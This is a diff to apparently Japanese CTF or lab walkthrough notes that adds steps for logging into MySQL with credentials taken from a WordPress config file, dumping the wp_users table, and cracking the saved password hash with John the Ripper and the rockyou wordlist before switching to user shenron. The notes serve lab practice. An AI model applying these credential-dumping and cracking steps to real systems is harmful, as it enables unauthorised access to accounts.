@@ -42,8 +42,18 @@
 - 設定ファイルを見る
   - wordpress:Wordpress@123
 - MySQLに接続する
-  - wordpress:Wordpress@123
-  - 何があるか?
+```
+mysql -h localhost -uwordpress -pWordpress@123`
+show databases;
+use wordpress;
+show tables;
+use wp_users;
+select * from wp_users\G
+```
+- userとpasswordをメモっておく。passwordはjohn the rippserで使うのでpass.txtとして保存する。
+  - `$P$BCpX~`を貼り付ける 
+- `sudo john --wordlist=/usr/share/wordlists/rockyou pass.txt`
+
 - shenronにユーザを変える
   - `su shenron`
   - ここでは初めのiloverockyouのパスワードだったが、MySQLで得られたパスワードが必要かもしれない
